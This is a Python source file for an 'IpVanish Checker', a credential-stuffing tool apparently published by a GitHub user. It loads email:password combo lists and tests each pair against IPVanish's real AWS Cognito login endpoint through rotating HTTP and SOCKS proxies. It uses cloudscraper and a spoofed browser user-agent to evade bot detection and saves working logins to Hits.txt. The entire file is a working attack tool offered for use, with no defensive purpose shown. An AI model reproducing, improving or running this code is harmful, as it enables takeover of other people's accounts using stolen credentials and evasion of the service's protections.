import requests
import cloudscraper
import json
import time
import random
from colorama import Fore, init
from  threading import Thread
import os

cl = cloudscraper.create_scraper()

url = 'https://idp.sso.ipvanish.com/'

headers = {
    'Content-Type': 'application/x-amz-json-1.1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'X-Amz-Target': 'AWSCognitoIdentityProviderService.InitiateAuth',
    'X-Amz-User-Agent':'aws-amplify/5.0.4 js'
}

init(convert=True)

red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW 
white = Fore.WHITE
cyan = Fore.CYAN
black = Fore.BLACK
lr = Fore.LIGHTRED_EX
lb = Fore.LIGHTBLUE_EX
lc = Fore.LIGHTCYAN_EX

def diaplay_intro():
        

    print(f'''{green}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
                           {green} ▪   ▄▄▄· ▌ ▐· ▄▄▄·  ▐ ▄ ▪  .▄▄ ·  ▄ .▄   {white}  ▌ ▐· ▄▄▄· ▐ ▄ 
                           {green} ██ ▐█ ▄█▪█·█▌▐█ ▀█ •█▌▐███ ▐█ ▀. ██▪▐█   {white} ▪█·█▌▐█ ▄█•█▌▐█
                           {green} ▐█· ██▀·▐█▐█•▄█▀▀█ ▐█▐▐▌▐█·▄▀▀▀█▄██▀▐█   {white} ▐█▐█• ██▀·▐█▐▐▌
                           {green} ▐█▌▐█▪·• ███ ▐█ ▪▐▌██▐█▌▐█▌▐█▄▪▐███▌▐▀   {white}  ███ ▐█▪·•██▐█▌
                           {green} ▀▀▀.▀   . ▀   ▀  ▀ ▀▀ █▪▀▀▀ ▀▀▀▀ ▀▀▀ ·   {white} . ▀  .▀   ▀▀ █▪
                            
                                                                                                                                                                                                                                                                                                                   
 
                            {red}|    {lb}[+] {white}Name        {cyan}: {green}IpVanish Checker               {red}|
                            {red}|                                                     {red}|
                            {red}|    {lb}[+] {white}Instagram   {cyan}: {green}Apkalees                       {red}| 
                            {red}|                                                     {red}| 
                            {red}|    {lb}[+] {white}Github      {cyan}: {green}https://github.com/apkaless    {red}| 
                            {red}|                                                     {red}|
                            {red}|    {lb}[+] {white}Nationality {cyan}: {green}Iraq                           {red}|

                                   
''')


captures = []
deads = []
errors = []
bot = []

def display_info(captures: int, deads: int, errors: int, total: int, bot):
    os.system('cls')
    print(f'''{green}                  
                                      {green}▪   ▄▄▄· ▌ ▐· ▄▄▄·  ▐ ▄ ▪  .▄▄ ·  ▄ .▄    {white} ▌ ▐· ▄▄▄· ▐ ▄ 
                                      {green}██ ▐█ ▄█▪█·█▌▐█ ▀█ •█▌▐███ ▐█ ▀. ██▪▐█    {white}▪█·█▌▐█ ▄█•█▌▐█
                                      {green}▐█· ██▀·▐█▐█•▄█▀▀█ ▐█▐▐▌▐█·▄▀▀▀█▄██▀▐█    {white}▐█▐█• ██▀·▐█▐▐▌
                                      {green}▐█▌▐█▪·• ███ ▐█ ▪▐▌██▐█▌▐█▌▐█▄▪▐███▌▐▀    {white} ███ ▐█▪·•██▐█▌
                                      {green}▀▀▀.▀   . ▀   ▀  ▀ ▀▀ █▪▀▀▀ ▀▀▀▀ ▀▀▀ ·    {white}. ▀  .▀   ▀▀ █▪
                                                 
{white}========================================================================================================================

                                                                                                                                                
                                                    {white}[!] Total Accounts: [{str(total).strip()}]

                                                    {green}[+] Hits: [{str(captures).strip()}]

                                                    {red}[-] Dead: [{str(deads).strip()}]

                                                    {red}[-] Bot Detection: [{bot}]

                                                    {lr}[-] Errors: [{str(errors).strip()}]

                                                                                                                                                        
{green}========================================================================================================================

''')


def ipVanish(combos, proxieslist):

    loop = False

    global proxies

    proxies = []

    working_proxies = []

    reusecombo = []

    for prx in proxieslist:
        prx = prx.strip()
        proxies.append(prx)


    for combo in combos:

        while True:

            if len(reusecombo) > 0:

                combo = reusecombo[0]

                email = combo.split(':')[0]

                password = combo.split(':')[1]

                reusecombo.clear()

            else:

                combo = combo.strip() #email:pass

                email = combo.split(':')[0]

                password = combo.split(':')[1]

            if len(working_proxies) > 0:
                
                proxy = working_proxies[0]

                working_proxies.clear()

            else:
                
                for proxy in proxies:

                    proxy = proxy

                    proxies.pop(0)

                    break

            protos = [f'http://{proxy}', f'socks4://{proxy}', f'socks5://{proxy}']

            for pproxy in protos:


                if len(reusecombo) == 1:

                    reusecombo.clear()

                else:
                    pass

                payload = {
                    "AuthFlow":"USER_PASSWORD_AUTH",
                    "ClientId":"4ec6gq3ktcm5g5f2p134ot7qi2", #26
                    "AuthParameters":{"USERNAME":f"{email}","PASSWORD":f"{password}"},
                    "ClientMetadata":{}
                    }
                
                try:

                    res = cl.post(url, headers=headers, json=payload, proxies={'https': f'{pproxy}'}, timeout=10)


                    if res.status_code == 403: # proxy Has been Flagged, Change Proxy But Reuse The Same Combo
                        reusecombo.append(combo)
                        working_proxies.clear()
                        loop = False
                        continue

                    elif res.status_code == 400: # Proxy Works But Account Dead, Break The While Loop
                        if combo in deads:
                            pass
                        else:
                            deads.append(combo)

                        working_proxies.clear()
                        working_proxies.append(proxy)


                        loop = True
                        break
                    
                    elif res.status_code == 418: # Proxy Has Been Detected As a Bot, Ignore That Proxy and Use Another One But Re use The Same Combo
                        reusecombo.append(combo)
                        bot.append(pproxy)
                        working_proxies.clear()
                        loop = False
                        continue



                    else:
                        if combo in captures:
                            pass

                        else:

                            captures.append(combo) # Account Works Fine
                            with open('Hits.txt', 'a') as hit:
                                hit.writelines([combo, '\n'])
                                hit.close()

                        working_proxies.append(proxy)

                        loop = True
                        break

                except Exception as e: # Proxy Dead
                    reusecombo.append(combo)
                    errors.append(e)
                    working_proxies.clear()        
                    loop = False
                    continue
            
            if loop:
                break

            else:
                continue

if __name__ == '__main__':
    
    import os

    while True:
        try:

            diaplay_intro()

            ipvanishfile = input(f'{cyan}[+] {yellow}Drag Combo List {white}===> ')

            ipvanlist = open(ipvanishfile, 'r').readlines()

            rpxfile = input(f'\n{cyan}[+] {yellow}Drag Proxy List {white}===> ')

            rpx = open(rpxfile, 'r').readlines()

            total = len(ipvanlist)

            total_proxy = len(rpx)

            break

        except:
            os.system('cls')
            continue
    
    while True:
        
        for i in range(1):

            err = len(errors)

            if err > 30000:
                errors.clear()

            display_info(captures=len(captures), deads=len(deads), errors=err, total=total, bot=len(bot))

            th = Thread(target=ipVanish, args=(ipvanlist, rpx,))
            th.start()
            time.sleep(0.05)
            


